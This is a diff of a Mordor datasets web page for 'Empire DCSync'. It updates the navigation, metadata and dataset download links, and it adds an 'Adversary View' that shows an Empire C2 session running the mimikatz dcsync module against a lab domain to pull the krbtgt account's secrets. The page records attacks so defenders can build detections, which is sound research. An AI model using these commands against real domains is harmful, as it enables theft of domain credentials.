@@ -37,8 +37,8 @@
     <link rel="shortcut icon" href="../../../../_static/favicon.ico"/>
     <link rel="index" title="Index" href="../../../../genindex.html" />
     <link rel="search" title="Search" href="../../../../search.html" />
-    <link rel="next" title="Empire Mimikatz Export Master Key" href="SDWIN-190518235535.html" />
-    <link rel="prev" title="Interactive Task Manager Lsass dump" href="SDWIN-191027054517.html" />
+    <link rel="next" title="Empire Mimikatz Backup Keys" href="SDWIN-190518235535.html" />
+    <link rel="prev" title="Empire Mimikatz SAM Extract Hashes" href="SDWIN-190625103712.html" />
 
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="docsearch:language" content="en">
@@ -48,7 +48,7 @@
 <meta property="og:url"         content="https://mordordatasets.com/notebooks/small/windows/06_credential_access/SDWIN-190301174830.html" />
 <meta property="og:type"        content="article" />
 <meta property="og:title"       content="Empire DCSync" />
-<meta property="og:description" content="Empire DCSync  Metadata          id  SDWIN-190301174830  author  Roberto Rodriguez @Cyb3rWard0g  creation date  2019/03/01  platform  Windows  Tactic(s)  [‘TA00" />
+<meta property="og:description" content="Empire DCSync  Metadata          Author  Roberto Rodriguez @Cyb3rWard0g  Creation Date  2019/03/01  Modification Date  2020/09/20  Tactics  [‘TA0006’]  Techniqu" />
 <meta property="og:image"       content="https://mordordatasets.com/_static/logo.png" />
 
 <meta name="twitter:card" content="summary" />
@@ -143,8 +143,13 @@
     </a>
     <ul>
      <li class="toctree-l3">
-      <a class="reference internal" href="../02_execution/SDWIN-191027042312.html">
-       Covenant Grunt Msbuild
+      <a class="reference internal" href="../02_execution/SDWIN-200806115603.html">
+       Covenant PowerShell Remoting Command
+      </a>
+     </li>
+     <li class="toctree-l3">
+      <a class="reference internal" href="../02_execution/SDWIN-200806035621.html">
+       Covenant SharpWMI Exec
       </a>
      </li>
      <li class="toctree-l3">
@@ -153,28 +158,13 @@
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../02_execution/SDWIN-190518215622.html">
-       Empire Invoke WMI Debugger
-      </a>
-     </li>
-     <li class="toctree-l3">
-      <a class="reference internal" href="../02_execution/SDWIN-190518214442.html">
-       Empire Invoke WMI
-      </a>
-     </li>
-     <li class="toctree-l3">
       <a class="reference internal" href="../02_execution/SDWIN-190518211052.html">
-       Empire DCOM ShellWindows
-      </a>
-     </li>
-     <li class="toctree-l3">
-      <a class="reference internal" href="../02_execution/SDWIN-190518231333.html">
-       WMIC Add User Backdoor
+       Empire Invoke DCOM ShellWindows
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../02_execution/SDWIN-200724174200.html">
-       WMI Event Subscription
+       Covenant Remote WMI Eventing ActiveScriptEventConsumers
       </a>
      </li>
      <li class="toctree-l3">
@@ -184,17 +174,27 @@
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../02_execution/SDWIN-190518213907.html">
-       Empire Invoke Msbuild
+       Empire Invoke Execute MSBuild
+      </a>
+     </li>
+     <li class="toctree-l3">
+      <a class="reference internal" href="../02_execution/SDWIN-200914080546.html">
+       Empire Remote WMIC Add User
+      </a>
+     </li>
+     <li class="toctree-l3">
+      <a class="reference internal" href="../02_execution/SDWIN-200921001437.html">
+       Empire Invoke WMI
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../02_execution/SDWIN-190518182022.html">
-       Empire Launcher VBS
+       Empire VBS Execution
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../02_execution/SDWIN-191027223020.html">
-       Covenant InstallUtil
+       Covenant ShellCmd InstallUtil
       </a>
      </li>
     </ul>
@@ -206,7 +206,7 @@
     <ul>
      <li class="toctree-l3">
       <a class="reference internal" href="../03_persistence/SDWIN-190319023812.html">
-       Empire Userland Registry Run Key
+       Empire Userland Registry Run Keys
       </a>
      </li>
      <li class="toctree-l3">
@@ -216,22 +216,22 @@
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../03_persistence/SDWIN-190518184306.html">
-       Empire Elevated WMI Subscription
+       Empire Elevated WMI Eventing
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../03_persistence/SDWIN-190518184109.html">
+      <a class="reference internal" href="../03_persistence/SDWIN-200921175806.html">
        Empire Elevated Scheduled Tasks
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../03_persistence/SDWIN-190403133337.html">
-       SCM and Dll Hijacking IKEEXT
+      <a class="reference internal" href="../03_persistence/SDWIN-200722001847.html">
+       Empire Elevated Registry Run Keys
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../03_persistence/SDWIN-190518183936.html">
-       Empire Elevated Registry
+      <a class="reference internal" href="../03_persistence/SDWIN-190403133337.html">
+       IKEEXT Remote Service DLL Hijack
       </a>
      </li>
     </ul>
@@ -243,22 +243,17 @@
     <ul>
      <li class="toctree-l3">
       <a class="reference internal" href="../04_privilege_escalation/SDWIN-200904032946.html">
-       Empire UAC Shell API FodHelper
-      </a>
-     </li>
-     <li class="toctree-l3">
-      <a class="reference internal" href="../04_privilege_escalation/SDWIN-190518204300.html">
-       Empire Invoke Runas
+       Invoke BypassUAC FodHelper
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../04_privilege_escalation/SDWIN-190518184306.html">
-       Empire Elevated WMI Subscription
+       Empire Elevated WMI Eventing
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../04_privilege_escalation/SDWIN-190518221344.html">
-       Empire DLL Injection
+       Empire Invoke DLLInjection
       </a>
      </li>
      <li class="toctree-l3">
@@ -268,7 +263,7 @@
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../04_privilege_escalation/SDWIN-190403133337.html">
-       SCM and Dll Hijacking IKEEXT
+       IKEEXT Remote Service DLL Hijack
       </a>
      </li>
     </ul>
@@ -279,38 +274,28 @@
     </a>
     <ul>
      <li class="toctree-l3">
-      <a class="reference internal" href="../05_defense_evasion/SDWIN-191027042312.html">
-       Covenant Grunt Msbuild
-      </a>
-     </li>
-     <li class="toctree-l3">
       <a class="reference internal" href="../05_defense_evasion/SDWIN-190518201922.html">
-       Empire Wdigest Downgrade
+       Empire WDigest Downgrade
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../05_defense_evasion/SDWIN-190518203650.html">
-       Empire Enabling RDP
-      </a>
-     </li>
-     <li class="toctree-l3">
-      <a class="reference internal" href="../05_defense_evasion/SDWIN-190518204300.html">
-       Empire Invoke Runas
+       Empire Enable RDP
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../05_defense_evasion/SDWIN-190319131123.html">
-       Empire Mimikatz OPTH
+       Empire Over-Pass-The-Hash
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../05_defense_evasion/SDWIN-190518221344.html">
-       Empire DLL Injection
+       Empire Invoke DLLInjection
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../05_defense_evasion/SDWIN-200721232741.html">
-       Empire Launcher SCT Regsvr32
+       Empire Regsvr32 Execution
       </a>
      </li>
      <li class="toctree-l3">
@@ -320,27 +305,22 @@
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../05_defense_evasion/SDWIN-190403133337.html">
-       SCM and Dll Hijacking IKEEXT
-      </a>
-     </li>
-     <li class="toctree-l3">
-      <a class="reference internal" href="../05_defense_evasion/SDWIN-190518213907.html">
-       Empire Invoke Msbuild
+       IKEEXT Remote Service DLL Hijack
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../05_defense_evasion/SDWIN-190301125905.html">
-       Empire DCSync ACL
+       Empire Powerview Add-DomainObjectAcl
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../05_defense_evasion/SDWIN-191225045202.html">
-       Extended NetNTLM Downgrade
+       Empire Invoke InternalMonologue
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../05_defense_evasion/SDWIN-191027223020.html">
-       Covenant InstallUtil
+       Covenant ShellCmd InstallUtil
       </a>
      </li>
     </ul>
@@ -352,37 +332,17 @@
     <ul class="current">
      <li class="toctree-l3">
       <a class="reference internal" href="SDWIN-190625133822.html">
-       Empire Reg Dump SAM
-      </a>
-     </li>
-     <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-191027064128.html">
-       Covenant DCSync All
-      </a>
-     </li>
-     <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-191205043030.html">
-       Covenant Mimikatz LSA Cache
+       Empire Reg Dump SAM Hive
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="SDWIN-191027055035.html">
-       Remote Interactive Task Manager Lsass dump
+       RDP TaskManager LSASS Dump
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="SDWIN-190625103712.html">
-       Empire Mimikatz Lsadump SAM
-      </a>
-     </li>
-     <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-191205043410.html">
-       Covenant Mimikatz LSA Secrets
-      </a>
-     </li>
-     <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-191027054517.html">
-       Interactive Task Manager Lsass dump
+       Empire Mimikatz SAM Extract Hashes
       </a>
      </li>
      <li class="toctree-l3 current active">
@@ -392,32 +352,27 @@
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="SDWIN-190518235535.html">
-       Empire Mimikatz Export Master Key
-      </a>
-     </li>
-     <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-191205033226.html">
-       Covenant Mimikatz Logonpasswords
+       Empire Mimikatz Backup Keys
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="SDWIN-190518202151.html">
-       Empire Mimikatz Logonpasswords
+       Empire Mimikatz LogonPasswords
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="SDWIN-190319145126.html">
-       Empire Rubeus ASKTGT
+       Rubeus Userland ASKTGT PTT
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-190319151006.html">
-       Empire Rubeus ASKTGT CreateNetOnly
+      <a class="reference internal" href="SDWIN-200922042230.html">
+       Empire Powerdump Extract Hashes
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="SDWIN-200807103913.html">
-       Empire Mimikatz Lsadump Patch
+       Empire Mimikatz Lsadump LSA Patch
       </a>
      </li>
      <li class="toctree-l3">
@@ -426,13 +381,13 @@
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-190625132210.html">
-       Empire Powerdump
+      <a class="reference internal" href="SDWIN-200921230246.html">
+       Rubeus Elevated ASKTGT CreateNetOnly
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="SDWIN-190518230752.html">
-       Empire Mimikatz Extract Tickets
+       Empire Mimikatz Extract Kerberos Keys
       </a>
      </li>
     </ul>
@@ -444,27 +399,22 @@
     <ul>
      <li class="toctree-l3">
       <a class="reference internal" href="../07_discovery/SDWIN-200806130039.html">
-       Covenant Ldap Search Request Domain Admins
+       Covenant GetDomainGroup Domain Admins
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../07_discovery/SDWIN-190518201207.html">
-       Empire Net Domain Admins Group
+       Empire Shell Net Domain Admins
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../07_discovery/SDWIN-190519005224.html">
-       Empire Get Local Sessions
+       Empire Remote Get Session
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../07_discovery/SDWIN-190319020147.html">
        Empire Net Local Administrators Group
-      </a>
-     </li>
-     <li class="toctree-l3">
-      <a class="reference internal" href="../07_discovery/SDWIN-190518230446.html">
-       Empire Net User Domain Specific
       </a>
      </li>
      <li class="toctree-l3">
@@ -474,12 +424,12 @@
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../07_discovery/SDWIN-190319021158.html">
-       Empire Net All User Domain
+       Empire Net Domain Users
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../07_discovery/SDWIN-190319020729.html">
-       Empire Net All Local Users
+       Empire Net Local Users
       </a>
      </li>
     </ul>
@@ -491,12 +441,12 @@
     <ul>
      <li class="toctree-l3">
       <a class="reference internal" href="../08_lateral_movement/SDWIN-190518210125.html">
-       Empire Invoke Smbexec
+       Empire Invoke SMBExec
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../08_lateral_movement/SDWIN-200806115603.html">
-       Covenant PsRemoting Command
+       Covenant PowerShell Remoting Command
       </a>
      </li>
      <li class="toctree-l3">
@@ -506,17 +456,17 @@
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../08_lateral_movement/SDWIN-200806035621.html">
-       Covenant WMI RemoteCreateInstance
+       Covenant SharpWMI Exec
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../08_lateral_movement/SDWIN-200806030120.html">
-       Covenant Service Start with StartServiceW
+       Covenant SharpSC Start
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../08_lateral_movement/SDWIN-200806015757.html">
-       Covenant SMB Create Request
+       Covenant Remote File Copy
       </a>
      </li>
      <li class="toctree-l3">
@@ -525,43 +475,28 @@
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-190518215622.html">
-       Empire Invoke WMI Debugger
-      </a>
-     </li>
-     <li class="toctree-l3">
       <a class="reference internal" href="../08_lateral_movement/SDWIN-200806022635.html">
-       Covenant Service Creation with CreateServiceA
-      </a>
-     </li>
-     <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-190518214442.html">
-       Empire Invoke WMI
+       Covenant SharpSC Create
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../08_lateral_movement/SDWIN-190319131123.html">
-       Empire Mimikatz OPTH
+       Empire Over-Pass-The-Hash
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../08_lateral_movement/SDWIN-200806031938.html">
-       Covenant RPC SMB ControlService
+       Covenant SharpSC Stop Service
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../08_lateral_movement/SDWIN-190518211052.html">
-       Empire DCOM ShellWindows
-      </a>
-     </li>
-     <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-190518231333.html">
-       WMIC Add User Backdoor
+       Empire Invoke DCOM ShellWindows
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../08_lateral_movement/SDWIN-200724174200.html">
-       WMI Event Subscription
+       Covenant Remote WMI Eventing ActiveScriptEventConsumers
       </a>
      </li>
      <li class="toctree-l3">
@@ -571,7 +506,7 @@
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../08_lateral_movement/SDWIN-200806012009.html">
-       Covenant Services Query with EnumServiceStatusW
+       Covenant SharpSC Query
       </a>
      </li>
      <li class="toctree-l3">
@@ -580,18 +515,28 @@
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200806101439.html">
-       Covenant WMI Query and Execute
+      <a class="reference internal" href="../08_lateral_movement/SDWIN-200805034820.html">
+       Covenant SC.exe Utility Query
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200805034820.html">
-       Covenant Service Query with QueryServiceStatus
+      <a class="reference internal" href="../08_lateral_movement/SDWIN-190518213907.html">
+       Empire Invoke Execute MSBuild
+      </a>
+     </li>
+     <li class="toctree-l3">
+      <a class="reference internal" href="../08_lateral_movement/SDWIN-200914080546.html">
+       Empire Remote WMIC Add User
       </a>
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../08_lateral_movement/SDWIN-200916232559.html">
-       Password Update via Netlogon Insecure AES-CFB8
+       Mimikatz Netlogon Unauthenticated NetrServerAuthenticate2
+      </a>
+     </li>
+     <li class="toctree-l3">
+      <a class="reference internal" href="../08_lateral_movement/SDWIN-200921001437.html">
+       Empire Invoke WMI
       </a>
      </li>
     </ul>
@@ -603,7 +548,7 @@
     <ul>
      <li class="toctree-l3">
       <a class="reference internal" href="../09_collection/SDWIN-200609225055.html">
-       MSF Record Microphone
+       MSF Record Mic
       </a>
      </li>
     </ul>
@@ -749,6 +694,21 @@
   </a>
  </li>
  <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#datasets-downloads">
+   Datasets Downloads
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#notebooks">
+   Notebooks
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#simulation-plan">
+   Simulation Plan
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
   <a class="reference internal nav-link" href="#adversary-view">
    Adversary View
   </a>
@@ -796,131 +756,227 @@
 </tr>
 </thead>
 <tbody>
-<tr class="row-even"><td class="text-align:left"><p>id</p></td>
-<td class="text-align:left"><p>SDWIN-190301174830</p></td>
-</tr>
-<tr class="row-odd"><td class="text-align:left"><p>author</p></td>
+<tr class="row-even"><td class="text-align:left"><p>Author</p></td>
 <td class="text-align:left"><p>Roberto Rodriguez &#64;Cyb3rWard0g</p></td>
 </tr>
-<tr class="row-even"><td class="text-align:left"><p>creation date</p></td>
+<tr class="row-odd"><td class="text-align:left"><p>Creation Date</p></td>
 <td class="text-align:left"><p>2019/03/01</p></td>
 </tr>
-<tr class="row-odd"><td class="text-align:left"><p>platform</p></td>
-<td class="text-align:left"><p>Windows</p></td>
+<tr class="row-even"><td class="text-align:left"><p>Modification Date</p></td>
+<td class="text-align:left"><p>2020/09/20</p></td>
 </tr>
-<tr class="row-even"><td class="text-align:left"><p>Tactic(s)</p></td>
+<tr class="row-odd"><td class="text-align:left"><p>Tactics</p></td>
 <td class="text-align:left"><p>[‘<a class="reference external" href="https://attack.mitre.org/tactics/TA0006">TA0006</a>’]</p></td>
 </tr>
-<tr class="row-odd"><td class="text-align:left"><p>Technique(s)</p></td>
+<tr class="row-even"><td class="text-align:left"><p>Techniques</p></td>
 <td class="text-align:left"><p>[‘<a class="reference external" href="https://attack.mitre.org/techniques/T1003/006">T1003.006</a>’]</p></td>
 </tr>
-<tr class="row-even"><td class="text-align:left"><p>Simulaton Environment</p></td>
-<td class="text-align:left"><p>Mordor shire</p></td>
-</tr>
-<tr class="row-odd"><td class="text-align:left"><p>Simulation Scripts</p></td>
-<td class="text-align:left"><p>[‘https://github.com/EmpireProject/Empire/blob/dev/data/module_source/credentials/Invoke-DCSync.ps1’]</p></td>
-</tr>
-<tr class="row-even"><td class="text-align:left"><p>Dataset Host</p></td>
-<td class="text-align:left"><p>[‘https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/host/empire_dcsync.tar.gz’]</p></td>
-</tr>
-<tr class="row-odd"><td class="text-align:left"><p>References</p></td>
-<td class="text-align:left"><p>None</p></td>
+<tr class="row-odd"><td class="text-align:left"><p>Tags</p></td>
+<td class="text-align:left"><p>[‘AD Replication services’, ‘RPC DRSUAPI DsGetNCChanges’]</p></td>
 </tr>
 </tbody>
 </table>
 </div>
 <div class="section" id="dataset-description">
 <h2>Dataset Description<a class="headerlink" href="#dataset-description" title="Permalink to this headline">¶</a></h2>
-<p>This dataset represents adversaries abusing Active Directory Replication services to retrieve NTLM hashes from domain accounts</p>
+<p>This dataset represents adversaries abusing Active Directory Replication services to retrieve secret domain data (i.e. NTLM hashes) from domain accounts.</p>
+</div>
+<div class="section" id="datasets-downloads">
+<h2>Datasets Downloads<a class="headerlink" href="#datasets-downloads" title="Permalink to this headline">¶</a></h2>
+<table class="colwidths-auto table">
+<thead>
+<tr class="row-odd"><th class="text-align:left head"><p>Dataset Type</p></th>
+<th class="text-align:left head"><p>Link</p></th>
+</tr>
+</thead>
+<tbody>
+<tr class="row-even"><td class="text-align:left"><p>Host</p></td>
+<td class="text-align:left"><p><a class="reference external" href="https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/host/empire_dcsync_dcerpc_drsuapi_DsGetNCChanges.zip">https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/host/empire_dcsync_dcerpc_drsuapi_DsGetNCChanges.zip</a></p></td>
+</tr>
+<tr class="row-odd"><td class="text-align:left"><p>Network</p></td>
+<td class="text-align:left"><p><a class="reference external" href="https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/network/empire_dcsync_dcerpc_drsuapi_DsGetNCChanges.zip">https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/network/empire_dcsync_dcerpc_drsuapi_DsGetNCChanges.zip</a></p></td>
+</tr>
+</tbody>
+</table>
+</div>
+<div class="section" id="notebooks">
+<h2>Notebooks<a class="headerlink" href="#notebooks" title="Permalink to this headline">¶</a></h2>
+<p>Notebooks created by the community leveraging the mordor datasets</p>
+<table class="colwidths-auto table">
+<thead>
+<tr class="row-odd"><th class="text-align:left head"><p>Author</p></th>
+<th class="text-align:left head"><p>Name</p></th>
+<th class="text-align:left head"><p>Link</p></th>
+</tr>
+</thead>
+<tbody>
+<tr class="row-even"><td class="text-align:left"><p>Threat Hunter Playbook</p></td>
+<td class="text-align:left"><p>Active Directory Replication From Non-Domain-Controller Accounts</p></td>
+<td class="text-align:left"><p><a class="reference external" href="https://threathunterplaybook.com/notebooks/windows/06_credential_access/credential_access/WIN-180815210510.html">https://threathunterplaybook.com/notebooks/windows/06_credential_access/credential_access/WIN-180815210510.html</a></p></td>
+</tr>
+</tbody>
+</table>
+</div>
+<div class="section" id="simulation-plan">
+<h2>Simulation Plan<a class="headerlink" href="#simulation-plan" title="Permalink to this headline">¶</a></h2>
+<table class="colwidths-auto table">
+<thead>
+<tr class="row-odd"><th class="text-align:left head"><p>Environment</p></th>
+<th class="text-align:left head"><p>Tool Type</p></th>
+<th class="text-align:left head"><p>Module</p></th>
+</tr>
+</thead>
+<tbody>
+<tr class="row-even"><td class="text-align:left"><p>Mordor shire</p></td>
+<td class="text-align:left"><p>C2</p></td>
+<td class="text-align:left"><p><a class="reference external" href="https://github.com/EmpireProject/Empire/blob/dev/data/module_source/credentials/Invoke-DCSync.ps1">DCSync</a></p></td>
+</tr>
+</tbody>
+</table>
 </div>
 <div class="section" id="adversary-view">
 <h2>Adversary View<a class="headerlink" href="#adversary-view" title="Permalink to this headline">¶</a></h2>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">usemodule</span> <span class="n">credentials</span><span class="o">/</span><span class="n">mimikatz</span><span class="o">/</span><span class="n">dcsync</span>
-<span class="nb">set</span> <span class="n">domain</span> <span class="n">shire</span><span class="o">.</span><span class="n">com</span>
-<span class="nb">set</span> <span class="n">user</span> <span class="n">pgustavo</span>
-<span class="nb">set</span> <span class="n">dc</span> <span class="n">HFDC01</span><span class="o">.</span><span class="n">shire</span><span class="o">.</span><span class="n">com</span>
-<span class="n">execute</span>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">stager</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">launcher</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">agents</span>
 
-  <span class="o">.</span><span class="c1">#####.   mimikatz 2.1.1 (x64) #17763 Feb 23 2019 12:03:02</span>
-<span class="o">.</span><span class="c1">## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo) ** Kitten Edition **</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Active</span> <span class="n">agents</span><span class="p">:</span>
+
+<span class="n">Name</span>     <span class="n">La</span> <span class="n">Internal</span> <span class="n">IP</span>     <span class="n">Machine</span> <span class="n">Name</span>      <span class="n">Username</span>                <span class="n">Process</span>            <span class="n">PID</span>    <span class="n">Delay</span>    <span class="n">Last</span> <span class="n">Seen</span>            <span class="n">Listener</span>
+<span class="o">----</span>     <span class="o">--</span> <span class="o">-----------</span>     <span class="o">------------</span>      <span class="o">--------</span>                <span class="o">-------</span>            <span class="o">---</span>    <span class="o">-----</span>    <span class="o">---------</span>            <span class="o">----------------</span>
+<span class="mi">4</span><span class="n">SUZ8X62</span> <span class="n">ps</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.5</span>     <span class="n">WORKSTATION5</span>      <span class="o">*</span><span class="n">THESHIRE</span>\<span class="n">pgustavo</span>      <span class="n">powershell</span>         <span class="mi">4092</span>   <span class="mi">5</span><span class="o">/</span><span class="mf">0.0</span>    <span class="mi">2020</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">21</span> <span class="mi">21</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="mi">29</span>  <span class="n">http</span>            
+<span class="mi">1</span><span class="n">EHYPBVC</span> <span class="n">ps</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.5</span>     <span class="n">WORKSTATION5</span>      <span class="o">*</span><span class="n">THESHIRE</span>\<span class="n">pgustavo</span>      <span class="n">powershell</span>         <span class="mi">7456</span>   <span class="mi">5</span><span class="o">/</span><span class="mf">0.0</span>    <span class="mi">2020</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">21</span> <span class="mi">22</span><span class="p">:</span><span class="mi">56</span><span class="p">:</span><span class="mi">58</span>  <span class="n">http</span>            
+
+<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">agents</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">interact</span> <span class="mi">1</span><span class="n">EHYPBVC</span>
+<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="mi">1</span><span class="n">EHYPBVC</span><span class="p">)</span> <span class="o">&gt;</span> 
+<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="mi">1</span><span class="n">EHYPBVC</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">usemodule</span> <span class="n">credentials</span><span class="o">/</span><span class="n">mimikatz</span><span class="o">/</span><span class="n">dcsync</span>
+<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">powershell</span><span class="o">/</span><span class="n">credentials</span><span class="o">/</span><span class="n">mimikatz</span><span class="o">/</span><span class="n">dcsync</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">set</span> <span class="n">user</span> <span class="n">krbtgt</span>
+<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">powershell</span><span class="o">/</span><span class="n">credentials</span><span class="o">/</span><span class="n">mimikatz</span><span class="o">/</span><span class="n">dcsync</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">set</span> <span class="n">domain</span> <span class="n">theshire</span><span class="o">.</span><span class="n">local</span>
+<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">powershell</span><span class="o">/</span><span class="n">credentials</span><span class="o">/</span><span class="n">mimikatz</span><span class="o">/</span><span class="n">dcsync</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">set</span> <span class="n">dc</span> <span class="n">MORDORDC</span><span class="o">.</span><span class="n">theshire</span><span class="o">.</span><span class="n">local</span>
+<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">powershell</span><span class="o">/</span><span class="n">credentials</span><span class="o">/</span><span class="n">mimikatz</span><span class="o">/</span><span class="n">dcsync</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">info</span>
+
+              <span class="n">Name</span><span class="p">:</span> <span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span> <span class="n">DCsync</span>
+            <span class="n">Module</span><span class="p">:</span> <span class="n">powershell</span><span class="o">/</span><span class="n">credentials</span><span class="o">/</span><span class="n">mimikatz</span><span class="o">/</span><span class="n">dcsync</span>
+        <span class="n">NeedsAdmin</span><span class="p">:</span> <span class="kc">False</span>
+        <span class="n">OpsecSafe</span><span class="p">:</span> <span class="kc">True</span>
+          <span class="n">Language</span><span class="p">:</span> <span class="n">powershell</span>
+<span class="n">MinLanguageVersion</span><span class="p">:</span> <span class="mi">2</span>
+        <span class="n">Background</span><span class="p">:</span> <span class="kc">True</span>
+  <span class="n">OutputExtension</span><span class="p">:</span> <span class="kc">None</span>
+
+<span class="n">Authors</span><span class="p">:</span>
+  <span class="nd">@gentilkiwi</span>
+  <span class="n">Vincent</span> <span class="n">Le</span> <span class="n">Toux</span>
+  <span class="nd">@JosephBialek</span>
+
+<span class="n">Description</span><span class="p">:</span>
+  <span class="n">Runs</span> <span class="n">PowerSploit</span><span class="s1">&#39;s Invoke-Mimikatz function to extract a</span>
+  <span class="n">given</span> <span class="n">account</span> <span class="n">password</span> <span class="n">through</span> <span class="n">Mimikatz</span><span class="s1">&#39;s lsadump::dcsync</span>
+  <span class="n">module</span><span class="o">.</span> <span class="n">This</span> <span class="n">doesn</span><span class="s1">&#39;t need code execution on a given DC, but</span>
+  <span class="n">needs</span> <span class="n">to</span> <span class="n">be</span> <span class="n">run</span> <span class="kn">from</span> <span class="nn">a</span> <span class="n">user</span> <span class="n">context</span> <span class="k">with</span> <span class="n">DA</span> <span class="n">equivalent</span>
+  <span class="n">privileges</span><span class="o">.</span>
+
+<span class="n">Comments</span><span class="p">:</span>
+  <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">blog</span><span class="o">.</span><span class="n">gentilkiwi</span><span class="o">.</span><span class="n">com</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">clymb3r</span><span class="o">.</span><span class="n">wordpress</span><span class="o">.</span><span class="n">com</span><span class="o">/</span>
+
+<span class="n">Options</span><span class="p">:</span>
+
+  <span class="n">Name</span>   <span class="n">Required</span>    <span class="n">Value</span>                     <span class="n">Description</span>
